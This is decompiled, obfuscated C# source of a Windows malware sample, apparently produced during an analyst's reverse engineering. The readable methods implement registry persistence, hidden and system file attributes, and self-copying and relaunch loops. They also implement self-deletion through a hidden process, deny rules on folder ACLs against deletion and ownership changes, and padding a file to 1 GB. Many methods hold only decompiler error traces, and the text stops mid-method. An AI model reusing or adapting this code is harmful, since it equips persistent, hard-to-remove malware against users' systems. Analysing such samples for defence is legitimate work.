using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class _____________________________________________________________________________
{
	private static FileStream _;

	public static string __;

	public static bool ___;

	private static bool ____;

	static _____________________________________________________________________________()
	{
		_____________________________________________________________________________.___ = false;
		_____________________________________________________________________________.____ = false;
	}

	public static void _()
	{
		// 
		// Current member / type: System.Void _____________________________________________________________________________::_()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void __(string string_0)
	{
		try
		{
			string string0 = string_0;
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(string0, true);
			if (registryKey == null)
			{
				Registry.CurrentUser.CreateSubKey(string0);
			}
			registryKey.SetValue(______________________________________________________________._________________, string.Concat(<Module>.______<string>(-1591756196), _____________________________________________________________________________.__, <Module>._____<string>(349267069)));
			registryKey.Close();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___()
	{
		// 
		// Current member / type: System.Void _____________________________________________________________________________::___()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ___()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void ____()
	{
		// 
		// Current member / type: System.Void _____________________________________________________________________________::____()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ____()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void _____()
	{
		// 
		// Current member / type: System.Void _____________________________________________________________________________::_____()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _____()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void ______(string string_0)
	{
		// 
		// Current member / type: System.Void _____________________________________________________________________________::______(System.String)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ______(System.String)
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void _______(string string_0)
	{
		try
		{
			if (Directory.Exists(string_0))
			{
				(new FileInfo(string_0)).Attributes = FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ________()
	{
		int num = 0;
		string str = null;
		object length;
		bool flag;
		try
		{
			if (Operators.CompareString(______________________________________________________________.________________, <Module>._____<string>(-577222963), false) == 0)
			{
				goto Label0;
			}
			_____________________________________________________________________________.__ = Application.ExecutablePath;
			str = string.Concat(______________________.__, ______________________________________________________________.________________);
			num = -32577;
			int num1 = ___________._;
			if (4194304 * (num1 << 15) - -2147483648 == num1 % 65 << 5)
			{
				Thread.Sleep(9000);
				if (File.Exists(str))
				{
					_____________________________________________________________________________.__ = str;
					______________________._______ = -1978466511;
					if (______________________________________________________________.___________________.Contains(<Module>._______<string>(-21638100)))
					{
						(new Thread(new ThreadStart(_____________________________________________________________________________._________))).Start();
					}
					try
					{
						flag = _____________________________________________________________________________.DeleteFile(string.Concat(str, <Module>.______<string>(1524908573)));
					}
					catch (Exception exception)
					{
						ProjectData.SetProjectError(exception);
						ProjectData.ClearProjectError();
					}
				}
				return;
			}
			if (Application.ExecutablePath.Contains(______________________________________________________________.________________))
			{
				return;
			}
			if (!Application.ExecutablePath.Contains(<Module>._______<string>(764547847)))
			{
				goto Label3;
			}
			num == -32577;
			Thread.Sleep(60000);
			if (______________________________________________________________.____(______________________________________________________________.__________________))
			{
				ProjectData.EndApp();
			}
			if (!File.Exists(str))
			{
				goto Label4;
			}
		Label8:
			Process.Start(str);
		Label4:
			Thread.Sleep(60000);
			if (!______________________________________________________________.____(______________________________________________________________.__________________))
			{
				goto Label3;
			}
			goto Label5;
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
		length = Type.EmptyTypes.Length + 2;
	Label12:
		switch (length)
		{
			case 0:
			{
				break;
			}
			case 1:
			{
				goto Label8;
			}
			case 2:
			{
				return;
			}
			case 3:
			{
				_____________._.FileSystem.CopyFile(Application.ExecutablePath, str);
				_____________________________________________________________________________.__________(str);
				if (num == 17582)
				{
					Thread.Sleep(9000);
					if (File.Exists(str))
					{
						_____________________________________________________________________________.__ = str;
						______________________._______ = -1978466511;
						if (______________________________________________________________.___________________.Contains(<Module>._______<string>(-21638100)))
						{
							(new Thread(new ThreadStart(_____________________________________________________________________________._________))).Start();
						}
						try
						{
							flag = _____________________________________________________________________________.DeleteFile(string.Concat(str, <Module>.______<string>(1524908573)));
						}
						catch (Exception exception)
						{
							ProjectData.SetProjectError(exception);
							ProjectData.ClearProjectError();
						}
					}
					return;
				}
				else
				{
					break;
				}
			}
			default:
			{
				return;
			}
		}
	Label5:
		ProjectData.EndApp();
	Label3:
		_____________________________________________________________________________._______________(______________________.__);
		if (!_____________._.FileSystem.FileExists(str))
		{
			goto Label11;
		}
		Thread.Sleep(5000);
		_____________________________________________________________________________._______________(______________________.__);
		_____________________________________________________________________________._______________(str);
		File.Move(str, string.Concat(Path.GetTempPath(), _________________.____________(8, <Module>.______<string>(-235798359))));
		______________________.__();
		_____________________________________________________________________________.________();
		return;
	Label11:
		num = 17582;
		length = sizeof(byte) + 2;
		goto Label12;
	}

	public static void _________()
	{
		// 
		// Current member / type: System.Void _____________________________________________________________________________::_________()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _________()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void __________(string string_0)
	{
		try
		{
			string str = string.Concat(Application.ExecutablePath, <Module>._____<string>(-400086917));
			if (File.Exists(str))
			{
				_____________._.FileSystem.CopyFile(str, string.Concat(string_0, <Module>.____<string>(-782546797)));
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________(string string_0)
	{
		try
		{
			-1757 == Type.EmptyTypes.Length + -1758;
			if (!___________________________________________________________________.______())
			{
				int num = 1073741824;
				FileStream fileStream = File.OpenWrite(string_0);
				for (long i = fileStream.Seek(0L, SeekOrigin.End); i < (long)num; i = i + 1L)
				{
					fileStream.WriteByte(0);
				}
				fileStream.Close();
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____________()
	{
		_____________________________________________________________________________._____();
		try
		{
			_________________________________________________________________.__();
			_____________________________________________________________________________._______________(_____________________________________________________________________________.__);
			_____________________________________________________________________________._______________(______________________.__);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		try
		{
			Random random = new Random();
			string tempPath = Path.GetTempPath();
			int num = random.Next(1000, 9000);
			string str = string.Concat(tempPath, num.ToString(), <Module>.___<string>(-1322036565));
			File.Move(_____________________________________________________________________________.__, str);
			_________________________________________________.___________(Application.ExecutablePath);
			_________________________________________________.___________(_____________________________________________________________________________.__);
			_____________________________________________________________________________._____________(5000, str);
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			_________________________________________________.___________(_____________________________________________________________________________.__);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
		Environment.Exit(0);
	}

	public static void _____________(int int_0, string string_0)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(<Module>.______<string>(168821456));
			string[] strArrays = new string[] { <Module>.____<string>(1516698134), int_0.ToString(), <Module>._____<string>(406488863), string_0, <Module>._____<string>(1419880545) };
			processStartInfo.Arguments = string.Concat(strArrays);
			processStartInfo.CreateNoWindow = true;
			processStartInfo.ErrorDialog = false;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
			Process.GetCurrentProcess().Kill();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	public static void _______________(string string_0)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(false, true);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ________________(string string_0)
	{
		int num = 0;
		DirectorySecurity directorySecurity = null;
		int num1 = 0;
		string str = null;
		int num2 = 0;
		DirectoryInfo directoryInfo = null;
		int num3 = 0;
		object length;
		try
		{
			if (4345 != Type.EmptyTypes.Length + 4345)
			{
				goto Label0;
			}
			string string0 = string_0;
			str = <Module>.______<string>(857767335);
			directoryInfo = new DirectoryInfo(string0);
			num2 = -3260;
			if (Type.EmptyTypes.Length + 13302 == -12083)
			{
				goto Label1;
			}
			<Module>.______________ = -1437277352;
			directorySecurity = new DirectorySecurity();
			directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.ReadAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
		Label3:
			directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.AppendData, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			num2 = (num3 * 14 + num3 * 2 + 5100 == 7009 ? (int)(sizeof(float) + -909701266) : Type.EmptyTypes.Length + 3335);
			if (~(num3 << 6 | num * 262144) == 64 * -num3)
			{
				length = sizeof(ushort) + 1989660861;
				goto Label2;
			}
			else if (-(3831296 * num) * 4 + 75048 == (num << 19) + 5557)
			{
				length = sizeof(byte) + -1974894255;
				goto Label2;
			}
			else if (~(num1 + num1) != num1 / 108435561 >> 31)
			{
				length = sizeof(Guid) + -16;
				goto Label2;
			}
			else
			{
				length = sizeof(int) + 780747020;
				goto Label2;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
	Label5:
		directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
		length = Type.EmptyTypes.Length + 2;
	Label2:
		while (true)
		{
			switch (length)
			{
				case 0:
				{
					break;
				}
				case 2:
				{
					directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.DeleteSubdirectoriesAndFiles, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
					length = Type.EmptyTypes.Length + 3;
					continue;
				}
				case 3:
				{
					directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
					directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
					directorySecurity.SetAccessRuleProtection(false, true);
					directoryInfo.SetAccessControl(directorySecurity);
					return;
				}
				case 4:
				{
					goto Label5;
				}
				default:
				{
					goto Label3;
				}
			}
		}
	Label1:
